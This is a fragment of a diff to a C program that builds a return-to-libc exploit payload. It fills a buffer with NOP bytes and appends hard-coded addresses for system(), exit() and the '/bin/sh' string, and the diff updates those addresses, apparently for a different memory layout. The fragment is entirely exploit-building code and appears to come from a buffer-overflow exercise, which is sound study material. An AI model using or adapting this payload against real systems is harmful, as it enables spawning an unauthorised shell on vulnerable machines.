@@ -18,9 +18,10 @@ int main(void)
   {
   	strcat(str, "\x90");
   }  
-  char *system = "\xb0\x2d\xe4\xb7";
-  char *exit = "\xe0\x69\xe3\xb7";
-  char *bin_sh = "\x2b\x3b\xf6\xb7";
+  char *system = "\xb0\xdc\xdc\xf7";
+  char *exit = "\xc0\x01\xdc\xf7";
+  char *bin_sh = "\xf5\xf0\xf3\xf7";
+  
 
   strcat(str, system);
   strcat(str, exit);
